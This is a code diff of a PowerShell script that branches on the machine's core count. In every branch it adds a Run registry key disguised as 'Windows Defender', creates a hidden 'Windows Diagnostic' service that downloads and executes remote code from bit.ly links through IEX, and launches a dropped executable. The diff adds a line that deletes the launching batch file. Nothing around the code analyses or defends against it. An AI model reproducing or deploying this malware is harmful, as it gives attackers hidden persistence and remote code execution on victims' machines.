@@ -10,6 +10,7 @@ switch ($n)
 		New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
                 New-Service -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2olWimV');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
                 start-process -FilePath 'C:\Users\Public\MSASCuiL.exe'
+		Remove-Item C:\Users\Public\run.bat -Recurse
 		Exit
 		} 
         2 
@@ -21,6 +22,7 @@ switch ($n)
 		New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
                 New-Service -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2ojGG3k');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
                 start-process -FilePath 'C:\Users\Public\MSASCuiL.exe'
+		Remove-Item C:\Users\Public\run.bat -Recurse
 		Exit       
 		}
         4 { 
@@ -32,6 +34,7 @@ switch ($n)
 		New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
                 New-Service -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2wrCOlr');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
                 start-process -FilePath 'C:\Users\Public\MSASCuiL.exe'
+		Remove-Item C:\Users\Public\run.bat -Recurse
 		Exit       
 	}
         8 { 
@@ -42,6 +45,7 @@ switch ($n)
 		New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
                 New-Service -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2Ph0KPi');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
                 start-process -FilePath 'C:\Users\Public\MSASCuiL.exe'
+		Remove-Item C:\Users\Public\run.bat -Recurse
 		Exit         
 	}
   default { write-host "$n cores"           }
